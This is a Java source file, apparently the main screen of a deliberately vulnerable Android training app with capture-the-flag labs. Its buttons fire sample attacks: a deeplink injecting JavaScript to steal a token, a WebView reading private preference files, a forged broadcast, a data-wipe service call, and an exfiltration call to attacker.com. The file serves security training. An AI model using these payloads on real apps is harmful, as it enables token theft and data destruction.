package com.vulndroid.app.activities;

import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import com.vulndroid.app.R;

public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        getSharedPreferences("user_prefs", MODE_PRIVATE).edit()
            .putString("auth_token", "eyJhbGciOiJIUzI1NiJ9.VICTIM_TOKEN")
            .putString("username", "victim_user").apply();

        // WebView buttons — all go to WebView lab
        findViewById(R.id.btn_webview).setOnClickListener(v -> startActivity(new Intent(this, WebViewActivity.class)));
        findViewById(R.id.btn_webview2).setOnClickListener(v -> startActivity(new Intent(this, WebViewActivity.class)));
        findViewById(R.id.btn_webview3).setOnClickListener(v -> {
            Intent i = new Intent(this, WebViewActivity.class);
            i.putExtra("url", "file:///data/data/com.vulndroid.app/shared_prefs/user_prefs.xml");
            startActivity(i);
        });
        findViewById(R.id.btn_webview4).setOnClickListener(v -> startActivity(new Intent(this, WebViewActivity.class)));

        // Deeplink buttons
        findViewById(R.id.btn_deeplink).setOnClickListener(v -> startActivity(new Intent(this, DeeplinkActivity.class)));
        findViewById(R.id.btn_deeplink2).setOnClickListener(v -> startActivity(new Intent(this, DeeplinkActivity.class)));
        findViewById(R.id.btn_deeplink_chain).setOnClickListener(v -> {
            Intent i = new Intent(Intent.ACTION_VIEW);
            i.setData(Uri.parse("vulndroid://settings?redirect=com.vulndroid.app.activities.WebViewActivity&url=javascript:VulnBridge.stealToken()"));
            startActivity(i);
        });

        // Login SQL injection
        findViewById(R.id.btn_login).setOnClickListener(v -> startActivity(new Intent(this, LoginActivity.class)));

        // Admin panel direct
        findViewById(R.id.btn_admin).setOnClickListener(v -> startActivity(new Intent(this, AdminPanelActivity.class)));

        // Broadcast
        findViewById(R.id.btn_broadcast).setOnClickListener(v -> {
            Intent b = new Intent("com.vulndroid.app.SEND_TOKEN");
            b.setPackage(getPackageName());
            b.putExtra("token", "INJECTED_" + System.currentTimeMillis());
            b.putExtra("user", "attacker");
            sendBroadcast(b);
            Toast.makeText(this, "Broadcast sent! Check logcat.", Toast.LENGTH_SHORT).show();
        });
        findViewById(R.id.btn_broadcast2).setOnClickListener(v -> startActivity(new Intent(this, LogcatLeakActivity.class)));

        // Service
        findViewById(R.id.btn_service_wipe).setOnClickListener(v -> {
            Intent s = new Intent();
            s.setComponent(new ComponentName(this, "com.vulndroid.app.services.DataSyncService"));
            s.putExtra("action", "wipe_user_data");
            startService(s);
            Toast.makeText(this, "Wipe triggered!", Toast.LENGTH_SHORT).show();
        });
        findViewById(R.id.btn_service_exfil).setOnClickListener(v -> {
            Intent s = new Intent();
            s.setComponent(new ComponentName(this, "com.vulndroid.app.services.DataSyncService"));
            s.putExtra("action", "sync");
            s.putExtra("endpoint", "http://attacker.com/collect");
            startService(s);
            Toast.makeText(this, "Exfil triggered!", Toast.LENGTH_SHORT).show();
        });

        // Submit + Scoreboard
        findViewById(R.id.btn_xss).setOnClickListener(v -> startActivity(new Intent(this, XssLabActivity.class)));

        findViewById(R.id.btn_storage).setOnClickListener(v -> startActivity(new Intent(this, InsecureStorageActivity.class)));

        findViewById(R.id.btn_fileprovider).setOnClickListener(v -> startActivity(new Intent(this, FileProviderActivity.class)));

        findViewById(R.id.btn_otp).setOnClickListener(v -> startActivity(new Intent(this, OtpBruteForceActivity.class)));

        findViewById(R.id.btn_network).setOnClickListener(v -> startActivity(new Intent(this, NetworkLabActivity.class)));

        findViewById(R.id.btn_submit_flag).setOnClickListener(v -> startActivity(new Intent(this, FlagSubmitActivity.class)));
        findViewById(R.id.btn_scoreboard).setOnClickListener(v -> startActivity(new Intent(this, FlagBoardActivity.class)));
    }
}
